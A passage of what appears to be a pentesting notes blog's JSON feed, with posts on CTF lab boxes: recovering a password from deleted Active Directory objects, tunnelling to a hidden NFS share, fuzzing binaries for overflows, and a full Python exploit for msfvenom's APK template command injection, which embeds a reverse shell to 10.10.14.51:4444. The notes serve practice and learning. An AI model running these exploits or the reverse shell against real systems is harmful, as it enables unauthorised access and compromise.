class=\"nx\">group</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nx\">Enabled</span><span class=\"w\"> </span><span class=\"nx\">by</span><span class=\"w\"> </span><span class=\"nx\">default</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nx\">Enabled</span><span class=\"w\"> </span><span class=\"nx\">group</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nx\">Local</span><span class=\"w\"> </span><span class=\"nx\">Group</span><span class=\"w\"></span><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\users\\arksvc</span><span class=\"err\">&gt;</span><span class=\"w\"> </span></code></pre></div></div><ul>  <li>Check if you can see deleted objects</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Get-ADObject</span><span class=\"w\"> </span><span class=\"nt\">-filter</span><span class=\"w\"> </span><span class=\"s1\">'isDeleted -eq $true -and name -ne \"Deleted Objects\"'</span><span class=\"w\"> </span><span class=\"nt\">-includeDeletedObjects</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Find juicy information</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"mi\">45689883479503</span><span class=\"w\"></span><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\users</span><span class=\"err\">&gt;</span><span class=\"w\"> </span><span class=\"nx\">Get-ADObject</span><span class=\"w\"> </span><span class=\"nt\">-filter</span><span class=\"w\"> </span><span class=\"s1\">'isDeleted -eq $true'</span><span class=\"w\"> </span><span class=\"nt\">-includeDeletedObjects</span><span class=\"w\"> </span><span class=\"nt\">-Properties</span><span class=\"w\"> </span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">findstr</span><span class=\"w\"> </span><span class=\"nx\">cascadeLegacyPwd</span><span class=\"w\"></span><span class=\"n\">cascadeLegacyPwd</span><span class=\"w\">                </span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"nx\">YmFDVDNyMWFOMDBkbGVz</span><span class=\"w\"></span><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\users</span><span class=\"err\">&gt;</span><span class=\"w\"> </span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Cascade</li>  <li>    <table>      <tbody>        <tr>          <td>[Active Directory Recycle Bin</td>          <td>Recover Deleted AD Object</td>          <td>AD Deleted Objects](https://stealthbits.com/blog/active-directory-object-recovery-recycle-bin/)</td>        </tr>      </tbody>    </table>  </li>  <li><a href=\"https://stealthbits.com/blog/active-directory-object-recovery-recycle-bin/\">ACTIVE DIRECTORY OBJECT RECOVERY (RECYCLE BIN)</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/30/ad-recycle-bin",
            
            
            
            "tags": ["windows","ad","pivot","privesc"],
            
            "date_published": "2022-04-30T00:00:00+08:00",
            "date_modified": "2022-04-30T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/28/nfs-hidden-mount",
            "title": "NFS hidden mount",
            "summary": "NFS hidden mount",
            "content_text": "  In THM overpass 3 box, i encountered an NFS port open and listening to all address but I cannot reach it from attacker machine. I suspect firewall is restricting the access.# ss outputtcp   LISTEN      0       64                 0.0.0.0:2049         0.0.0.0:*                                                                                     tcp   ESTAB       0       0                127.0.0.1:42724      127.0.0.1:2049                                                                                  tcp   ESTAB       0       0                127.0.0.1:2049       127.0.0.1:42724                                                                                 tcp   LISTEN      0       64                    [::]:2049            [::]:*    # /etc/exports/home/james *(rw,fsid=0,sync,no_root_squash,insecure)  So in order to access it, I used SSH tunnel technique and mount it on attacker machine via localhost.# from attacker machinessh -L 3049:127.0.0.1:2049 paradox@10.10.190.17  I tried to mount it but it failed with mount(2): No such file or directory error.# from attacker machinesudo mount -vv -t nfs -o port=3049 127.0.0.1:/ /mnt  I saw some redhat reference about fsid and I tried to change my mount a bit and it worked!# / instead of /home/jamessudo mount -vv -t nfs -o port=3049 127.0.0.1:/ /mnt",
            "content_html": "<ul>  <li>In THM overpass 3 box, i encountered an NFS port open and listening to all address but I cannot reach it from attacker machine. I suspect firewall is restricting the access.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># ss output</span>tcp   LISTEN      0       64                 0.0.0.0:2049         0.0.0.0:<span class=\"k\">*</span>                                                                                     tcp   ESTAB       0       0                127.0.0.1:42724      127.0.0.1:2049                                                                                  tcp   ESTAB       0       0                127.0.0.1:2049       127.0.0.1:42724                                                                                 tcp   LISTEN      0       64                    <span class=\"o\">[</span>::]:2049            <span class=\"o\">[</span>::]:<span class=\"k\">*</span>    <span class=\"c\"># /etc/exports</span>/home/james <span class=\"k\">*</span><span class=\"o\">(</span>rw,fsid<span class=\"o\">=</span>0,sync,no_root_squash,insecure<span class=\"o\">)</span></code></pre></div></div><ul>  <li>So in order to access it, I used SSH tunnel technique and mount it on attacker machine via localhost.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># from attacker machine</span>ssh <span class=\"nt\">-L</span> 3049:127.0.0.1:2049 paradox@10.10.190.17</code></pre></div></div><ul>  <li>I tried to mount it but it failed with <code class=\"language-plaintext highlighter-rouge\">mount(2): No such file or directory</code> error.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># from attacker machine</span><span class=\"nb\">sudo </span>mount <span class=\"nt\">-vv</span> <span class=\"nt\">-t</span> nfs <span class=\"nt\">-o</span> <span class=\"nv\">port</span><span class=\"o\">=</span>3049 127.0.0.1:/ /mnt</code></pre></div></div><ul>  <li>I saw some redhat <a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/s1-nfs-server-config-exports\">reference</a> about <code class=\"language-plaintext highlighter-rouge\">fsid</code> and I tried to change my mount a bit and it worked!</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># / instead of /home/james</span><span class=\"nb\">sudo </span>mount <span class=\"nt\">-vv</span> <span class=\"nt\">-t</span> nfs <span class=\"nt\">-o</span> <span class=\"nv\">port</span><span class=\"o\">=</span>3049 127.0.0.1:/ /mnt</code></pre></div></div>",
            "url": "https://mvineza.github.io/spindel/2022/04/28/nfs-hidden-mount",
            
            
            
            "tags": ["linux","nfs","pivot"],
            
            "date_published": "2022-04-28T00:00:00+08:00",
            "date_modified": "2022-04-28T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/24/fuzzing-and-binary-inspection-techniques",
            "title": "Fuzzing and Binary Inspection Techniques",
            "summary": "Fuzzing and Binary Inspection Techniques",
            "content_text": "System and Library CallsIts helpful to always see what system and library calls the binary is performing.# You can see what files, directories, or libraries it# is accessingltrace ./myapp # check system callsstrace /usr/bin/myappI experience this scenario when using ltrace - It appeared that in order to escalate my privileges, I just need to set admin=1 based from ltrace output..www-data@blog:/var/www/wordpress$ ltrace /usr/sbin/checkergetenv(\"admin\")                                  = nilputs(\"Not an Admin\"Not an Admin)                             = 13+++ exited (status 0) +++www-data@blog:/var/www/wordpress$ export admin=1www-data@blog:/var/www/wordpress$ checkerroot@blog:/var/www/wordpress# iduid=0(root) gid=33(www-data) groups=33(www-data)root@blog:/var/www/wordpress#  Segmentation Fault PointBefore finding the instruction pointer offset, you need to find where is the point of the program where buffer overflow occurs. One example is to do an ltrace.$ ./backup a a $(python -c 'print(\"A\"*1000)')# [...redacted...]strcpy(0xffbb0081, \"/\")                          = 0xffbb0081strcpy(0xffbb008d, \"/\")                          = 0xffbb008d# [...redacted...]strstr(\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"..., \"/etc\")strcpy(0xff9020ac, \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"...)# [...redacted...]--- SIGSEGV (Segmentation fault) ---+++ killed by SIGSEGV +++Based from the output above, it looks like it segfaulted on the last instance of strcpy right after strstr. We can now go inside gdb and examine the assembly layout and find the last instance of strcpy.# [...redacted...]0x080489d4 &lt;+22&gt;:\tcall   0x8048670 &lt;strcpy@plt&gt;# [...redacted...]Once we find it out, we can now add a breakpoint on that location. This is just an example, there might be better ways to do this like for example, if you use peda, it will automatically stopped at the buffer overflow point.Parameters Detection  Some custom binaries might not tell you what parameters it can accept such as /usr/local/bin/backup from HTB Node. You can find out the parameters it accept in different ways.# Find readable stringsstirngs /usr/local/bin/backuop# Increment the parameters until you get an output/usr/local/bin/backup a/usr/local/bin/backup a a/usr/local/bin/backup a a a# Increment with fuzzer/usr/local/bin/backup $(python -c \"print('A'*1000)\")/usr/local/bin/backup a $(python -c \"print('A'*1000)\")/usr/local/bin/backup a a $(python -c \"print('A'*1000)\")ManualHere is an example for THM room brainstorm.  Generate buffer in python&gt;&gt;&gt; 'A'*2000&gt;&gt;&gt; # use the output&gt;&gt;&gt; 'A'*2500&gt;&gt;&gt; # use the output  Use the output above on name and message inputsPlease enter your username (max 20 characters): ***Write a message: ***  See where will the program crashed  Once you determine on what input the program crashed, you can now use scripts (e.g python) to continue in finding the offset, eip, etc ..  ::NOTE:: I tried fuzzing name input and it crashed at 15000 bytes buffer which is too much! This is most likely wrong so if you encounter this, try fuzzing other input. One indication if this is wrong is when you generate pattern in msfvenom but the EIP offset cannnot be found.Spiking  Here is an example for Vulnserver  Create spike script# file: trun.spks_readline();s_string(\"TRUN \");s_string_variable(\"0\");  Execute spike against targetgeneric_send_tcp 192.168.18.33 9999 trun.spk 0 0  Other resources          An introduction to fuzzing: using fuzzers (SPIKE) to find vulnerabilities - Infosec Resources —&gt; see also powerpoint included      ",
            "content_html": "<h2 id=\"system-and-library-calls\">System and Library Calls</h2><p>Its helpful to always see what system and library calls the binary is performing.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># You can see what files, directories, or libraries it</span><span class=\"c\"># is accessing</span>ltrace ./myapp <span class=\"c\"># check system calls</span>strace /usr/bin/myapp</code></pre></div></div><p>I experience this scenario when using <code class=\"language-plaintext highlighter-rouge\">ltrace</code> - It appeared that in order to escalate my privileges, I just need to set <code class=\"language-plaintext highlighter-rouge\">admin=1</code> based from <code class=\"language-plaintext highlighter-rouge\">ltrace</code> output..</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>www-data@blog:/var/www/wordpress<span class=\"nv\">$ </span>ltrace /usr/sbin/checkergetenv<span class=\"o\">(</span><span class=\"s2\">\"admin\"</span><span class=\"o\">)</span>                                  <span class=\"o\">=</span> nilputs<span class=\"o\">(</span><span class=\"s2\">\"Not an Admin\"</span>Not an Admin<span class=\"o\">)</span>                             <span class=\"o\">=</span> 13+++ exited <span class=\"o\">(</span>status 0<span class=\"o\">)</span> +++www-data@blog:/var/www/wordpress<span class=\"nv\">$ </span><span class=\"nb\">export </span><span class=\"nv\">admin</span><span class=\"o\">=</span>1www-data@blog:/var/www/wordpress<span class=\"nv\">$ </span>checkerroot@blog:/var/www/wordpress# <span class=\"nb\">id</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>33<span class=\"o\">(</span>www-data<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>33<span class=\"o\">(</span>www-data<span class=\"o\">)</span>root@blog:/var/www/wordpress#  </code></pre></div></div><h2 id=\"segmentation-fault-point\">Segmentation Fault Point</h2><p>Before finding the instruction pointer offset, you need to find where is the point of the program where buffer overflow occurs. One example is to do an <code class=\"language-plaintext highlighter-rouge\">ltrace</code>.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>./backup a a <span class=\"si\">$(</span>python <span class=\"nt\">-c</span> <span class=\"s1\">'print(\"A\"*1000)'</span><span class=\"si\">)</span><span class=\"c\"># [...redacted...]</span>strcpy<span class=\"o\">(</span>0xffbb0081, <span class=\"s2\">\"/\"</span><span class=\"o\">)</span>                          <span class=\"o\">=</span> 0xffbb0081strcpy<span class=\"o\">(</span>0xffbb008d, <span class=\"s2\">\"/\"</span><span class=\"o\">)</span>                          <span class=\"o\">=</span> 0xffbb008d<span class=\"c\"># [...redacted...]</span>strstr<span class=\"o\">(</span><span class=\"s2\">\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"</span>..., <span class=\"s2\">\"/etc\"</span><span class=\"o\">)</span>strcpy<span class=\"o\">(</span>0xff9020ac, <span class=\"s2\">\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"</span>...<span class=\"o\">)</span><span class=\"c\"># [...redacted...]</span><span class=\"nt\">---</span> SIGSEGV <span class=\"o\">(</span>Segmentation fault<span class=\"o\">)</span> <span class=\"nt\">---</span>+++ killed by SIGSEGV +++</code></pre></div></div><p>Based from the output above, it looks like it segfaulted on the last instance of <code class=\"language-plaintext highlighter-rouge\">strcpy</code> right after <code class=\"language-plaintext highlighter-rouge\">strstr</code>. We can now go inside gdb and examine the assembly layout and find the last instance of <code class=\"language-plaintext highlighter-rouge\">strcpy</code>.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># [...redacted...]</span>0x080489d4 &lt;+22&gt;:\tcall   0x8048670 &lt;strcpy@plt&gt;<span class=\"c\"># [...redacted...]</span></code></pre></div></div><p>Once we find it out, we can now add a breakpoint on that location. This is just an example, there might be better ways to do this like for example, if you use peda, it will automatically stopped at the buffer overflow point.</p><h2 id=\"parameters-detection\">Parameters Detection</h2><ul>  <li>Some custom binaries might not tell you what parameters it can accept such as <code class=\"language-plaintext highlighter-rouge\">/usr/local/bin/backup</code> from HTB Node. You can find out the parameters it accept in different ways.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Find readable strings</span>stirngs /usr/local/bin/backuop<span class=\"c\"># Increment the parameters until you get an output</span>/usr/local/bin/backup a/usr/local/bin/backup a a/usr/local/bin/backup a a a<span class=\"c\"># Increment with fuzzer</span>/usr/local/bin/backup <span class=\"si\">$(</span>python <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*1000)\"</span><span class=\"si\">)</span>/usr/local/bin/backup a <span class=\"si\">$(</span>python <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*1000)\"</span><span class=\"si\">)</span>/usr/local/bin/backup a a <span class=\"si\">$(</span>python <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*1000)\"</span><span class=\"si\">)</span></code></pre></div></div><h2 id=\"manual\">Manual</h2><p>Here is an example for THM room brainstorm.</p><ul>  <li>Generate buffer in python</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"s\">'A'</span><span class=\"o\">*</span><span class=\"mi\">2000</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"c1\"># use the output</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"s\">'A'</span><span class=\"o\">*</span><span class=\"mi\">2500</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"c1\"># use the output</span></code></pre></div></div><ul>  <li>Use the output above on name and message inputs</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>Please enter your username <span class=\"o\">(</span>max 20 characters<span class=\"o\">)</span>: <span class=\"k\">***</span>Write a message: <span class=\"k\">***</span></code></pre></div></div><ul>  <li>See where will the program crashed</li>  <li>Once you determine on what input the program crashed, you can now use scripts (e.g python) to continue in finding the offset, eip, etc ..</li>  <li>::NOTE:: I tried fuzzing name input and it crashed at 15000 bytes buffer which is too much! This is most likely wrong so if you encounter this, try fuzzing other input. One indication if this is wrong is when you generate pattern in <code class=\"language-plaintext highlighter-rouge\">msfvenom</code> but the EIP offset cannnot be found.</li></ul><h2 id=\"spiking\">Spiking</h2><ul>  <li>Here is an example for Vulnserver</li>  <li>Create spike script</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># file: trun.spk</span>s_readline<span class=\"o\">()</span><span class=\"p\">;</span>s_string<span class=\"o\">(</span><span class=\"s2\">\"TRUN \"</span><span class=\"o\">)</span><span class=\"p\">;</span>s_string_variable<span class=\"o\">(</span><span class=\"s2\">\"0\"</span><span class=\"o\">)</span><span class=\"p\">;</span></code></pre></div></div><ul>  <li>Execute spike against target</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>generic_send_tcp 192.168.18.33 9999 trun.spk 0 0</code></pre></div></div><ul>  <li>Other resources    <ul>      <li><a href=\"https://resources.infosecinstitute.com/topic/intro-to-fuzzing/\">An introduction to fuzzing: using fuzzers (SPIKE) to find vulnerabilities - Infosec Resources</a> —&gt; see also powerpoint included</li>    </ul>  </li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/24/fuzzing-and-binary-inspection-techniques",
            
            
            
            "tags": ["linux","bof"],
            
            "date_published": "2022-04-24T00:00:00+08:00",
            "date_modified": "2022-04-24T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/21/android-apk-command-injection-via-msfvenom-template",
            "title": "Android APK Command Injection via msfvenom template",
            "summary": "Android APK Command Injection via msfvenom template",
            "content_text": "OverviewAttacker can upload malicuous APK file which contains arbritrary commands which then can be used as a template file for msfvenom command.Versions Tested  Metasploit 6.0.9Steps  Install jarsignersudo apt install openjdk-11-jdk-headless  Create the following python script#!/usr/bin/env python3import subprocessimport tempfileimport osfrom base64 import b32encode# Change me# payload = 'echo \"Code execution as $(id)\" &gt; /tmp/win'# payload = 'ping -c 1 10.10.14.51'# payload = 'bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1'payload = '/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1\"'# b32encode to avoid badchars (keytool is picky)# thanks to @fdellwing for noticing that base64 can sometimes break keytool# &lt;https://github.com/justinsteven/advisories/issues/2&gt;payload_b32 = b32encode(payload.encode()).decode()dname = f\"CN='|echo {payload_b32} | base32 -d | sh #\"print(f\"[+] Manufacturing evil apkfile\")print(f\"Payload: {payload}\")print(f\"-dname: {dname}\")print()tmpdir = tempfile.mkdtemp()apk_file = os.path.join(tmpdir, \"evil.apk\")empty_file = os.path.join(tmpdir, \"empty\")keystore_file = os.path.join(tmpdir, \"signing.keystore\")storepass = keypass = \"password\"key_alias = \"signing.key\"# Touch empty_fileopen(empty_file, \"w\").close()# Create apk_filesubprocess.check_call([\"zip\", \"-j\", apk_file, empty_file])# Generate signing key with malicious -dnamesubprocess.check_call([\"keytool\", \"-genkey\", \"-keystore\", keystore_file, \"-alias\", key_alias, \"-storepass\", storepass,                       \"-keypass\", keypass, \"-keyalg\", \"RSA\", \"-keysize\", \"2048\", \"-dname\", dname])# Sign APK using our malicious dnamesubprocess.check_call([\"jarsigner\", \"-sigalg\", \"SHA1withRSA\", \"-digestalg\", \"SHA1\", \"-keystore\", keystore_file,                       \"-storepass\", storepass, \"-keypass\", keypass, apk_file, key_alias])print()print(f\"[+] Done! apkfile is at {apk_file}\")print(f\"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null\")  Create APK file➜  exploit python3 create_evil_apk.py [+] Manufacturing evil apkfile[...redacted...][+] Done! apkfile is at /tmp/tmp9kymcdg3/evil.apk[...redacted...]➜  exploit   Open netcat listener  Upload APK file to web app, generate and wait for reverse connectionReferences  HTB ScriptKiddie  advisories/2020_metasploit_msfvenom_apk_template_cmdi.md at master · justinsteven/advisories · GitHub  Rapid7 Metasploit Framework msfvenom APK Template Command Injection",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can upload malicuous APK file which contains arbritrary commands which then can be used as a template file for <code class=\"language-plaintext highlighter-rouge\">msfvenom</code> command.</p><h2 id=\"versions-tested\">Versions Tested</h2><ul>  <li>Metasploit 6.0.9</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Install jarsigner</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">sudo </span>apt <span class=\"nb\">install </span>openjdk-11-jdk-headless</code></pre></div></div><ul>  <li>Create the following python script</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/env python3</span><span class=\"kn\">import</span> <span class=\"nn\">subprocess</span><span class=\"kn\">import</span> <span class=\"nn\">tempfile</span><span class=\"kn\">import</span> <span class=\"nn\">os</span><span class=\"kn\">from</span> <span class=\"nn\">base64</span> <span class=\"kn\">import</span> <span class=\"n\">b32encode</span><span class=\"c1\"># Change me# payload = 'echo \"Code execution as $(id)\" &gt; /tmp/win'# payload = 'ping -c 1 10.10.14.51'# payload = 'bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1'</span><span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"s\">'/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1\"'</span><span class=\"c1\"># b32encode to avoid badchars (keytool is picky)# thanks to @fdellwing for noticing that base64 can sometimes break keytool# &lt;https://github.com/justinsteven/advisories/issues/2&gt;</span><span class=\"n\">payload_b32</span> <span class=\"o\">=</span> <span class=\"n\">b32encode</span><span class=\"p\">(</span><span class=\"n\">payload</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">()).</span><span class=\"n\">decode</span><span class=\"p\">()</span><span class=\"n\">dname</span> <span class=\"o\">=</span> <span class=\"sa\">f</span><span class=\"s\">\"CN='|echo </span><span class=\"si\">{</span><span class=\"n\">payload_b32</span><span class=\"si\">}</span><span class=\"s\"> | base32 -d | sh #\"</span><span class=\"k\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"s\">\"[+] Manufacturing evil apkfile\"</span><span class=\"p\">)</span><span class=\"k\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"s\">\"Payload: </span><span class=\"si\">{</span><span class=\"n\">payload</span><span class=\"si\">}</span><span class=\"s\">\"</span><span class=\"p\">)</span><span class=\"k\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"s\">\"-dname: </span><span class=\"si\">{</span><span class=\"n\">dname</span><span class=\"si\">}</span><span class=\"s\">\"</span><span class=\"p\">)</span><span class=\"k\">print</span><span class=\"p\">()</span><span class=\"n\">tmpdir</span> <span class=\"o\">=</span> <span class=\"n\">tempfile</span><span class=\"p\">.</span><span class=\"n\">mkdtemp</span><span class=\"p\">()</span><span class=\"n\">apk_file</span> <span class=\"o\">=</span> <span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">path</span><span class=\"p\">.</span><span class=\"n\">join</span><span class=\"p\">(</span><span class=\"n\">tmpdir</span><span class=\"p\">,</span> <span class=\"s\">\"evil.apk\"</span><span class=\"p\">)</span><span class=\"n\">empty_file</span> <span class=\"o\">=</span> <span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">path</span><span class=\"p\">.</span><span class=\"n\">join</span><span class=\"p\">(</span><span class=\"n\">tmpdir</span><span class=\"p\">,</span> <span class=\"s\">\"empty\"</span><span class=\"p\">)</span><span class=\"n\">keystore_file</span> <span class=\"o\">=</span> <span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">path</span><span class=\"p\">.</span><span class=\"n\">join</span><span class=\"p\">(</span><span class=\"n\">tmpdir</span><span class=\"p\">,</span> <span class=\"s\">\"signing.keystore\"</span><span class=\"p\">)</span><span class=\"n\">storepass</span> <span class=\"o\">=</span> <span class=\"n\">keypass</span> <span class=\"o\">=</span> <span class=\"s\">\"password\"</span><span class=\"n\">key_alias</span> <span class=\"o\">=</span> <span class=\"s\">\"signing.key\"</span><span class=\"c1\"># Touch empty_file</span><span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">empty_file</span><span class=\"p\">,</span> <span class=\"s\">\"w\"</span><span class=\"p\">).</span><span class=\"n\">close</span><span class=\"p\">()</span><span class=\"c1\"># Create apk_file</span><span class=\"n\">subprocess</span><span class=\"p\">.</span><span class=\"n\">check_call</span><span class=\"p\">([</span><span class=\"s\">\"zip\"</span><span class=\"p\">,</span> <span class=\"s\">\"-j\"</span><span class=\"p\">,</span> <span class=\"n\">apk_file</span><span class=\"p\">,</span> <span class=\"n\">empty_file</span><span class=\"p\">])</span><span class=\"c1\"># Generate signing key with malicious -dname</span><span class=\"n\">subprocess</span><span class=\"p\">.</span><span class=\"n\">check_call</span><span class=\"p\">([</span><span class=\"s\">\"keytool\"</span><span class=\"p\">,</span> <span class=\"s\">\"-genkey\"</span><span class=\"p\">,</span> <span class=\"s\">\"-keystore\"</span><span class=\"p\">,</span> <span class=\"n\">keystore_file</span><span class=\"p\">,</span> <span class=\"s\">\"-alias\"</span><span class=\"p\">,</span> <span class=\"n\">key_alias</span><span class=\"p\">,</span> <span class=\"s\">\"-storepass\"</span><span class=\"p\">,</span> <span class=\"n\">storepass</span><span class=\"p\">,</span>                       <span class=\"s\">\"-keypass\"</span><span class=\"p\">,</span> <span class=\"n\">keypass</span><span class=\"p\">,</span> <span class=\"s\">\"-keyalg\"</span><span class=\"p\">,</span> <span class=\"s\">\"RSA\"</span><span class=\"p\">,</span> <span class=\"s\">\"-keysize\"</span><span class=\"p\">,</span> <span class=\"s\">\"2048\"</span><span class=\"p\">,</span> <span class=\"s\">\"-dname\"</span><span class=\"p\">,</span> <span class=\"n\">dname</span><span class=\"p\">])</span><span class=\"c1\"># Sign APK using our malicious dname</span><span class=\"n\">subprocess</span><span class=\"p\">.</span><span class=\"n\">check_call</span><span class=\"p\">([</span><span class=\"s\">\"jarsigner\"</span><span class=\"p\">,</span> <span class=\"s\">\"-sigalg\"</span><span class=\"p\">,</span> <span class=\"s\">\"SHA1withRSA\"</span><span class=\"p\">,</span> <span class=\"s\">\"-digestalg\"</span><span class=\"p\">,</span> <span class=\"s\">\"SHA1\"</span><span class=\"p\">,</span> <span class=\"s\">\"-keystore\"</span><span class=\"p\">,</span> <span class=\"n\">keystore_file</span><span class=\"p\">,</span>                       <span class=\"s\">\"-storepass\"</span><span class=\"p\">,</span> <span class=\"n\">storepass</span><span class=\"p\">,</span> <span class=\"s\">\"-keypass\"</span><span class=\"p\">,</span> <span class=\"n\">keypass</span><span class=\"p\">,</span> <span class=\"n\">apk_file</span><span class=\"p\">,</span> <span class=\"n\">key_alias</span><span class=\"p\">])</span><span class=\"k\">print</span><span class=\"p\">()</span><span class=\"k\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"s\">\"[+] Done! apkfile is at </span><span class=\"si\">{</span><span class=\"n\">apk_file</span><span class=\"si\">}</span><span class=\"s\">\"</span><span class=\"p\">)</span><span class=\"k\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"s\">\"Do: msfvenom -x </span><span class=\"si\">{</span><span class=\"n\">apk_file</span><span class=\"si\">}</span><span class=\"s\"> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null\"</span><span class=\"p\">)</span></code></pre></div></div><ul>  <li>Create APK file</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  exploit python3 create_evil_apk.py <span class=\"o\">[</span>+] Manufacturing evil apkfile<span class=\"o\">[</span>...redacted...]<span class=\"o\">[</span>+] Done! apkfile is at /tmp/tmp9kymcdg3/evil.apk<span class=\"o\">[</span>...redacted...]➜  exploit </code></pre></div></div><ul>  <li>Open netcat listener</li>  <li>Upload APK file to web app, generate and wait for reverse connection</li></ul><p><img src=\"/spindel/assets/Android%20APK%20Command%20Injection%20via%20msfvenom%20template/F7A1C4F0-2911-4E8E-8F52-AD3D081E1FEC.png\" alt=\"\" /></p><h2 id=\"references\">References</h2><ul>  <li>HTB ScriptKiddie</li>  <li><a href=\"https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md\">advisories/2020_metasploit_msfvenom_apk_template_cmdi.md at master · justinsteven/advisories · GitHub</a></li>  <li><a href=\"https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/\">Rapid7 Metasploit Framework msfvenom APK Template Command Injection</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/21/android-apk-command-injection-via-msfvenom-template",
            
            
            
            "tags": ["linux","foothold","android"],
            
            "date_published": "2022-04-21T00:00:00+08:00",
            "date_modified": "2022-04-21T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/19/eternal-blue",
